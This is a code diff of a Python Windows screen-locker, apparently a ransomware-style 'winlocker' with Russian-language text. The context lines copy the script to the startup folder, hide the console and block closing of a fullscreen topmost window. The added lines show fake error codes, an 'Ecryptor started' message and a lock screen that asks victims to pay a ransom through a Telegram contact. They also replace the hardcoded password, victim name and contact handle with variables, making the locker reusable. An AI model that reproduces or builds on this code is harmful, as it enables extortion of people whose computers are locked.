@@ -38,11 +38,15 @@ def add_to_startup_folder():
         shutil.copy2(script_path, startup_folder)
     except Exception as e:
          print("ошибка автозагрузки!")
-print("00x(2)00003 system error")
-print("00x1003")
-time.sleep(0.2)
-print("000x300002")
-print("000x0004200 Ecryptor activated!")
+print(r"""
+error: ox0374582
+error: 0x34769432
+error: 0x017238""")
+time.sleep(1)
+print(r"""error: 0x675825637
+error: 0x63836426""")
+time.sleep(0.5)
+print('Ecryptor started')
 time.sleep(1)
 os.system('cls' if os.name == 'nt' else 'clear')
 print(r"""
@@ -73,8 +77,8 @@ time.sleep(0.5)
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def check_input(event=None):
-    user_input = entry.get().strip()  
-    if user_input == "black hat":  
+    user_input = entry.get().strip() 
+    if user_input == f"{parol}":  
         messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
         root.destroy() 
     else:
@@ -91,11 +95,11 @@ root.attributes("-topmost", True)
 
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-label = tk.Label(root, text="ваш виндовс заблокирован k9gy", foreground="white", background="blue", font=("Arial", 35))
+label = tk.Label(root, text=f"ваш виндовс заблокирован {name}", foreground="white", background="blue", font=("Arial", 35))
 label.pack(pady=20)
 
 
-entry = tk.Entry(root, width=30, font=("Arial", 25))
+entry = tk.Entry(root, show="*", width=30, font=("Arial", 25))
 entry.pack(pady=10)
 
 
@@ -144,10 +148,10 @@ label.pack()
 
 label = tk.Label(
     root,
-    text=r"""
+    text=rf"""
     для откупа вы можете связатся с нами
     писать нужно в социальную сеть telegram
-    юзернейм автора @Halitava""",
+    юзернейм автора @{otkup}""",
     foreground="white",        
     background="blue",  
     font=("Arial", 30),
